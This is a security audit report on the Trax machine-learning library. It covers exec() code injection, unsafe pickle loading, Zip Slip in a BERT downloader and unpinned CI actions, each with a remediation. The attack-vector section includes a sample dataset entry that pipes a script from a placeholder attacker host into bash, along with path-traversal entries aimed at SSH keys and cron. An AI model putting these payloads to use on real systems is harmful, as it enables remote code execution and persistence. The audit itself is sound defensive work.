CRITICAL

exec() with globals() on Dataset-Controlled Program Code (RCE)

File: trax/data/tf_inputs.py — Lines 2262 and 2409

CWE: CWE-78 — OS Command Injection / CWE-94 — Code Injection

CVSS v3: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

Description: The execute_mathqa_program() function and the @gin.configurable decorated CreateMathQAInputs() function both call exec(program, globals(), var_dict) where program is assembled from lines in a dataset record file. The exec call runs with the full global namespace of the module, providing access to all imported modules including os, subprocess, and the entire Python standard library.

def execute_mathqa_program(problem, program):
    """Execute a MathQA program assembled from dataset records."""
    program = '\n'.join(program)
    var_dict = {}
    try:
        exec(program, globals(), var_dict)  # CRITICAL: runs with full globals()
    except:                                  # Bare except swallows ALL errors
        return None
    return var_dict.get('result', None)

# Line 2409 — @gin.configurable decorated function:
@gin.configurable(blacklist=['dataset', 'training'])
def CreateMathQAInputs(dataset, training, ...):
    ...
    result = execute_mathqa_program(problem, program_tokens)  # Same exec path

Attack vector: A maliciously crafted MathQA dataset file containing program entries like ["import os; os.system('curl attacker.com/shell.sh | bash')"] would execute with full Python interpreter access when the dataset is loaded for training. The bare except: clause silently swallows any exceptions, making detection difficult.

gin.configurable attack surface: The @gin.configurable decorator means this function's parameters (including the dataset path) can be overridden via gin configuration files, expanding the attack surface to configuration injection.

Remediation: Replace exec() with a safe expression evaluator for mathematical operations. Use ast.literal_eval() or a proper sandboxed math parser. If exec is truly necessary, use a restricted globals dict with {"__builtins__": {}} and only math-safe functions. Add dataset integrity verification (hash checking).

Unsafe pickle.load() for Model Checkpoints and Training State

Files:

  • trax/supervised/training.py — Lines 1258, 1261 — model checkpoint unpickling
  • trax/layers/base.py — Line 333 — layer weight checkpoint loading (gzip+pickle)
  • trax/rl/training.py — Line 154 — RL training state restoration
  • trax/data/inputs.py — Line 1115 — data counters loading

CWE: CWE-502 — Deserialization of Untrusted Data

CVSS v3: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

Description: Python's pickle module executes arbitrary Python code during deserialization. Any user-supplied checkpoint file (e.g., a pre-trained model checkpoint from an untrusted source, or a checkpoint loaded from a path controlled by an attacker) will achieve RCE when loaded.

# trax/supervised/training.py
def unpickle_from_file(file_path):
    with gzip.open(file_path, 'rb') as f:
        return pickle.load(f)   # Line 1258 — arbitrary code execution on load

# trax/layers/base.py
with gzip.open(path, 'rb') as gzipf:
    return pickle.load(gzipf)  # Line 333 — layer weights

# trax/rl/training.py
with open(path, 'rb') as f:
    return pickle.load(f)      # Line 154 — RL state

Impact: Any attacker who can supply a crafted checkpoint file achieves RCE. In cloud ML training environments, checkpoint paths are often configurable parameters — an attacker who can set the checkpoint path (e.g., via model-hub poisoning) achieves code execution.

Remediation: Replace pickle with numpy.save/load (for weights) or json/msgpack (for structured data). If pickle must be used, verify file integrity via HMAC-SHA256 before loading. Use Python 3.8+ pickle.loads(data, fix_imports=False) with restricted unpickler class.

HIGH

Zip Slip in BERT Model Downloader (urllib + extractall)

File: trax/models/research/bert.py — Line 237

CWE: CWE-22 — Path Traversal

CVSS v3: 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

Description: The BERT model downloader uses urllib.request.urlretrieve(model_link, download_path) to fetch a ZIP archive, then zipfile.ZipFile(download_path).extractall(download_dir) to unpack it. No path validation is performed on ZIP entry names before extraction.

import urllib.request, zipfile

def download_pretrained_bert(model_link, download_dir):
    download_path = os.path.join(download_dir, 'bert_model.zip')
    urllib.request.urlretrieve(model_link, download_path)  # No HTTPS enforcement
    with zipfile.ZipFile(download_path) as zf:
        zf.extractall(download_dir)  # Zip Slip — no path validation!

Attack scenario: A malicious ZIP archive containing entries like ../../.ssh/authorized_keys or ../../etc/cron.d/backdoor would write those files outside the intended download directory when extractall() is called. If the model_link parameter can be influenced by a user or configuration, this is exploitable remotely.

Remediation: Validate all ZIP entry paths before extraction:

import os, zipfile

def safe_extract(zf, path):
    for member in zf.namelist():
        member_path = os.path.realpath(os.path.join(path, member))
        if not member_path.startswith(os.path.realpath(path) + os.sep):
            raise ValueError(f"Zip Slip detected: {member}")
    zf.extractall(path)

Additionally, enforce HTTPS for the download URL and verify the archive against a known SHA-256 checksum.

Unpinned Actions and EOL Runtime Versions in CI

File: .github/workflows/build.yaml

CWE: CWE-494 — Download of Code Without Integrity Check

Description: The CI workflow uses unpinned action tags (actions/checkout@v2, actions/setup-python@v2) and installs EOL dependency versions:

uses: actions/checkout@v2        # Unpinned mutable tag
uses: actions/setup-python@v2    # Unpinned mutable tag

# CI installs:
python-version: '3.7'    # EOL June 2023 — no security patches
tensorflow==2.4.x         # EOL — multiple unpatched CVEs

Impact: Unpinned actions are vulnerable to supply chain attacks. EOL Python 3.7 and TensorFlow 2.4.x mean the CI environment has unpatched security vulnerabilities. Note: uses safe pull_request trigger (not pull_request_target), which limits blast radius.

Remediation: Pin actions to commit SHAs. Upgrade to Python 3.11+ and TensorFlow 2.x latest stable. Update the build matrix to test against supported runtime versions.

LOW

Bare except: Clause Silences Security-Relevant Exceptions

File: trax/data/tf_inputs.py (exec() context)

CWE: CWE-390 — Detection of Error Condition Without Action

Description: The bare except: clause in execute_mathqa_program() catches all exceptions including SystemExit, KeyboardInterrupt, and security-relevant exceptions. This makes malicious code execution harder to detect in logs and prevents defensive monitoring from observing anomalous exec() behavior.

Remediation: Replace bare except: with except Exception as e: and log the exception. More importantly, eliminate the exec() call entirely.
